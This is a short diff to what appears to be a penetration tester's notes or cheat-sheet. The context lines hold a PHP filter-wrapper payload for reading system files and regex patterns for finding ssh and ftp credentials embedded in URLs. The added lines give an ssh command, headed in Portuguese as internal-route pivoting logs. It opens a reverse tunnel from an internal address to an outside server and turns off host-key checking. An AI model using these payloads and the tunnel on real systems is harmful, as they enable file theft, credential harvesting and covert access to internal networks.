@@ -52,3 +52,6 @@ php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///et
 /ssh:\/\/.*:.*@.*target\.com/</br>
 /ftp:\/\/.*:.*@.*taget\.com/</br>
 /ssh:\/\/.*:.*@.*\.com/ NOT "git"</br>
+
+<h1>Log ssh pivoting rota interna </h1>
+ssh -tt -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i ./id_rsa -R 8888:10.0.1.2:80 -N simoc@103.106.0.2
